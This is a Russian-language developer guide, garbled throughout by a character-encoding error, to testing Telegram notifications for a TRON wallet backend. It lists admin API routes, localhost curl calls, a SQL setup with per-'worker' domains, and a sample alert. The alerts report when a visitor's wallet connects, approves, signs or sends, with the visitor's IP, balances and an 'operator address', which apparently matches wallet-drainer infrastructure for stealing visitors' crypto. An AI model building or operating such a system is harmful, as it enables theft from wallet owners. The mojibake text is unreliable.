# –†—É–∫–æ–≤–æ–¥—Å—Ç–≤–æ –ø–æ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—é —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π

## –û–±–∑–æ—Ä

–î–æ–±–∞–≤–ª–µ–Ω–∞ –ø–æ–ª–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞ –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è Telegram —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π —Å –º–æ–∫–æ–≤—ã–º–∏ –¥–∞–Ω–Ω—ã–º–∏ —á–µ—Ä–µ–∑ –∞–¥–º–∏–Ω API.

## –§–∞–π–ª—ã

### 1. –ö–æ–Ω—Ç—Ä–æ–ª–ª–µ—Ä —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π
`src/core/api/controllers/notification.controller.ts`
- –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç –≤—Å–µ API –∑–∞–ø—Ä–æ—Å—ã –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π
- –ì–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç –º–æ–∫–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ –¥–ª—è –∫–∞–∂–¥–æ–≥–æ —Ç–∏–ø–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è
- –í–∞–ª–∏–¥–∏—Ä—É–µ—Ç –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏ –¥–æ–º–µ–Ω–æ–≤

### 2. –†–æ—É—Ç—ã –∞–¥–º–∏–Ω–∫–∏
`src/routes/admin.ts` - –¥–æ–±–∞–≤–ª–µ–Ω—ã —Ä–æ—É—Ç—ã:
- `GET /admin/notifications/types` - –ø–æ–ª—É—á–∏—Ç—å –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ–º—ã–µ —Ç–∏–ø—ã
- `GET /admin/notifications/domains` - –ø–æ–ª—É—á–∏—Ç—å –¥–æ–º–µ–Ω—ã —Å —á–∞—Ç–∞–º–∏
- `GET /admin/notifications/domains/:id/validate` - –≤–∞–ª–∏–¥–∏—Ä–æ–≤–∞—Ç—å —á–∞—Ç—ã –¥–æ–º–µ–Ω–∞
- `POST /admin/notifications/test` - –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Ç–µ—Å—Ç–æ–≤–æ–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ
- `POST /admin/notifications/test-all` - –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –≤—Å–µ —Ç–∏–ø—ã —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π

### 3. –í–µ–±-–∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å
`notification-test-dashboard.html` - –ø–æ–ª–Ω–æ—Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω—ã–π –≤–µ–±-–∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è

### 4. –î–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏—è API
`docs/NOTIFICATIONS_API.md` - –ø–æ–ª–Ω–∞—è –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏—è –ø–æ API

## –ü–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ–º—ã–µ —Ç–∏–ø—ã —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π

1. **connection** - –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫–æ—à–µ–ª—å–∫–∞
2. **approved** - –û–¥–æ–±—Ä–µ–Ω–Ω–∞—è —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—è
3. **signed** - –ü–æ–¥–ø–∏—Å–∞–Ω–Ω–∞—è —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—è  
4. **send** - –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–Ω–∞—è —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—è
5. **balance_increase** - –£–≤–µ–ª–∏—á–µ–Ω–∏–µ –±–∞–ª–∞–Ω—Å–∞
6. **insufficient_balance** - –ù–µ–¥–æ—Å—Ç–∞—Ç–æ–∫ TRX –¥–ª—è –∫–æ–º–∏—Å—Å–∏–∏

## –ë—ã—Å—Ç—Ä—ã–π —Å—Ç–∞—Ä—Ç

### 1. –ß–µ—Ä–µ–∑ –≤–µ–±-–∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å
```bash
# –ó–∞–ø—É—Å—Ç–∏—Ç–µ —Å–µ—Ä–≤–µ—Ä
npm start

# –û—Ç–∫—Ä–æ–π—Ç–µ –≤ –±—Ä–∞—É–∑–µ—Ä–µ
notification-test-dashboard.html
```

1. –í–≤–µ–¥–∏—Ç–µ JWT —Ç–æ–∫–µ–Ω –∞–¥–º–∏–Ω–∞
2. –ó–∞–≥—Ä—É–∑–∏—Ç–µ –¥–∞—à–±–æ—Ä–¥
3. –í—ã–±–µ—Ä–∏—Ç–µ —Ç–∏–ø —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –∏ –¥–æ–º–µ–Ω
4. –û—Ç–ø—Ä–∞–≤—å—Ç–µ —Ç–µ—Å—Ç–æ–≤–æ–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ

### 2. –ß–µ—Ä–µ–∑ API –Ω–∞–ø—Ä—è–º—É—é

```bash
# –ü–æ–ª—É—á–∏—Ç—å JWT —Ç–æ–∫–µ–Ω (—Å–Ω–∞—á–∞–ª–∞ –∞–≤—Ç–æ—Ä–∏–∑—É–π—Ç–µ—Å—å)
curl -X POST http://localhost:3000/admin/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "your_password"}'

# –û—Ç–ø—Ä–∞–≤–∏—Ç—å —Ç–µ—Å—Ç–æ–≤–æ–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
curl -X POST http://localhost:3000/admin/notifications/test \
  -H "Authorization: Bearer YOUR_JWT_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"type": "connection", "domainId": 1}'

# –û—Ç–ø—Ä–∞–≤–∏—Ç—å –≤—Å–µ —Ç–∏–ø—ã —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π
curl -X POST http://localhost:3000/admin/notifications/test-all \
  -H "Authorization: Bearer YOUR_JWT_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"domainId": 1}'
```

## –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –¥–æ–º–µ–Ω–æ–≤

–£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ –≤ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö –µ—Å—Ç—å –¥–æ–º–µ–Ω—ã —Å –Ω–∞—Å—Ç—Ä–æ–µ–Ω–Ω—ã–º–∏ —á–∞—Ç–∞–º–∏:

```sql
-- –ü—Ä–∏–º–µ—Ä –∑–∞–ø–∏—Å–∏ –≤ —Ç–∞–±–ª–∏—Ü–µ Domain
INSERT INTO Domain (
  worker_id, 
  worker_nickname, 
  domain, 
  chats
) VALUES (
  'worker1',
  'TestWorker', 
  'example.com',
  '[{
    "chat_id": "-123456789",
    "token": "1234567890:ABCDEFGHIJKLMNOPQRSTUVWXYZ",
    "types": {
      "connection": true,
      "approved": true,
      "signed": true,
      "send": true,
      "balance_increase": true,
      "insufficient_balance": true
    }
  }]'
);
```

## –ú–æ–∫–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ

–î–ª—è –∫–∞–∂–¥–æ–≥–æ —Ç–∏–ø–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –≥–µ–Ω–µ—Ä–∏—Ä—É—é—Ç—Å—è —Ä–µ–∞–ª–∏—Å—Ç–∏—á–Ω—ã–µ –º–æ–∫–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ:

- **–ê–¥—Ä–µ—Å–∞ –∫–æ—à–µ–ª—å–∫–æ–≤**: –†–µ–∞–ª—å–Ω—ã–µ TRON –∞–¥—Ä–µ—Å–∞
- **–°—É–º–º—ã**: –°–ª—É—á–∞–π–Ω—ã–µ, –Ω–æ —Ä–µ–∞–ª–∏—Å—Ç–∏—á–Ω—ã–µ –∑–Ω–∞—á–µ–Ω–∏—è
- **TX ID**: –¢–µ—Å—Ç–æ–≤—ã–µ –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä—ã —Å timestamp
- **–ú–µ—Ç–∞–¥–∞–Ω–Ω—ã–µ**: –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –∫–æ—à–µ–ª—å–∫–µ –∏ –≤–æ—Ä–∫–µ—Ä–µ
- **IP –∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏—è**: –¢–µ—Å—Ç–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ

## –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ

–í—Å–µ –¥–µ–π—Å—Ç–≤–∏—è —Å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è–º–∏ –ª–æ–≥–∏—Ä—É—é—Ç—Å—è:

```bash
# –°–º–æ—Ç—Ä–µ—Ç—å –ª–æ–≥–∏ —á–µ—Ä–µ–∑ systemd
sudo journalctl -u mytronv2 -f

# –ò–ª–∏ —á–µ—Ä–µ–∑ –≤–µ–±-–∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å –≤ —Ä–∞–∑–¥–µ–ª–µ "Activity Logs"
```

## –£—Å—Ç—Ä–∞–Ω–µ–Ω–∏–µ –Ω–µ–ø–æ–ª–∞–¥–æ–∫

### 1. Telegram API –æ—à–∏–±–∫–∏
- –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ—Å—Ç—å bot token
- –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ –±–æ—Ç –¥–æ–±–∞–≤–ª–µ–Ω –≤ —á–∞—Ç
- –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ø—Ä–∞–≤–∞ –±–æ—Ç–∞ –Ω–∞ –æ—Ç–ø—Ä–∞–≤–∫—É —Å–æ–æ–±—â–µ–Ω–∏–π

### 2. JWT –æ—à–∏–±–∫–∏
- –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ —Ç–æ–∫–µ–Ω –Ω–µ –∏—Å—Ç–µ–∫
- –ü—Ä–æ–≤–µ—Ä—å—Ç–µ —Ñ–æ—Ä–º–∞—Ç: `Bearer <token>`

### 3. –û—à–∏–±–∫–∏ –ø–∞—Ä—Å–∏–Ω–≥–∞ —á–∞—Ç–æ–≤
- –ü—Ä–æ–≤–µ—Ä—å—Ç–µ JSON —Ñ–æ—Ä–º–∞—Ç –≤ –ø–æ–ª–µ `chats` —Ç–∞–±–ª–∏—Ü—ã Domain
- –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —ç–Ω–¥–ø–æ–∏–Ω—Ç `/validate` –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏

### 4. –û—à–∏–±–∫–∏ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
- –°–æ–∑–¥–∞–π—Ç–µ –∞–¥–º–∏–Ω–∞ —á–µ—Ä–µ–∑: `npm run create-admin`
- –ê–≤—Ç–æ—Ä–∏–∑—É–π—Ç–µ—Å—å —á–µ—Ä–µ–∑ `/admin/auth/login`

## –ü—Ä–∏–º–µ—Ä—ã —Å–æ–æ–±—â–µ–Ω–∏–π

### Connection notification:
```
üßä Wallet connected #TEST_1737200000000
 ‚î£ PayTag: #TestWorker | test-worker-001
 ‚î£ Domain: example.com
 ‚î£ IP: 192.168.1.100 (Unknown üè≥Ô∏è)
 ‚î£ üìñ Address: TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t (Tronscan)
 ‚î£ üì© Operator address: TLsV52sRDL79HXGGm9yzwKiW6SLumaGNHF (Tronscan)
 ‚îó Wallet name: Test Wallet

üîë Available balances:
native | 1000.50 TRX | 85.25$
token | 1165.50 USDT | 1165.50$

Total balance: 1250.75$

#connection
```

–¢–µ–ø–µ—Ä—å —É –≤–∞—Å –µ—Å—Ç—å –ø–æ–ª–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞ –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π! üéâ
